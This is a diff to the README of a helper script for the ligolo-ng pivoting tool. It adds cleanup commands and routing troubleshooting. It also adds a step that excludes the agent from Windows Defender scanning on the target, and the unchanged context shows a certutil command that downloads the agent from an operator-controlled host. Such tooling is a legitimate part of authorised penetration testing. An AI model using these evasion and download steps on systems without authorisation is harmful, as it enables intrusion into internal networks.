@@ -26,6 +26,11 @@ sudo ./ligolo-helper.sh auto
 
 Then follow the on-screen instructions.
 
+When done, clean up everything:
+```bash
+sudo ./ligolo-helper.sh cleanup
+```
+
 ## What `auto` Does
 
 1. Downloads ligolo-ng proxy and agent binaries (Linux/Windows/macOS)
@@ -65,6 +70,7 @@ STEP 2: Run agent on target
 | Command | Description |
 |---------|-------------|
 | `auto` | Full automatic setup - download, configure, and start |
+| `cleanup` | Stop everything and remove routes/TUN interface |
 | `download` | Download ligolo-ng binaries only |
 | `setup-tun` | Create TUN interface only |
 | `teardown-tun` | Remove TUN interface |
@@ -117,10 +123,30 @@ Make sure the proxy port is open:
 iptables -I INPUT -p tcp --dport 11601 -j ACCEPT
 ```
 
+### Windows Defender blocks agent
+Add an exclusion on the target before downloading:
+```powershell
+Add-MpPreference -ExclusionPath "C:\Users\Administrator\a.exe"
+```
+Then re-download and run the agent.
+
 ### Can't download on Windows target
 Try certutil instead:
 ```cmd
 certutil -urlcache -split -f http://YOUR_IP:8000/ligolo-agent.exe a.exe
+```
+
+### Connection drops when adding route
+**Do NOT route the target's own network through ligolo.** This breaks your connection to the target.
+
+Ligolo is for reaching *other* networks behind the target. For example:
+- Your target: `10.1.146.220` (you reach via RDP/VPN)
+- Target can see internal network: `192.168.x.x` (you can't reach directly)
+- Route the *internal* network through ligolo, not `10.1.146.0/24`
+
+If you accidentally added a bad route and lost connectivity:
+```bash
+sudo ./ligolo-helper.sh cleanup
 ```
 
 ### Route already exists
@@ -129,11 +155,16 @@ Remove it first:
 ./ligolo-helper.sh del-route 10.10.10.0/24
 ```
 
+### Invalid CIDR prefix error
+The network address must align to the prefix boundary. For example:
+- `/24` - last octet must be 0 (e.g., `10.1.146.0/24`)
+- `/18` - third octet must be 0, 64, 128, or 192 (e.g., `10.1.128.0/18`)
+
 ### TUN interface issues
-Reset the interface:
+Reset everything:
 ```bash
-./ligolo-helper.sh teardown-tun
-./ligolo-helper.sh setup-tun
+sudo ./ligolo-helper.sh cleanup
+sudo ./ligolo-helper.sh auto
 ```
 
 ## Credits
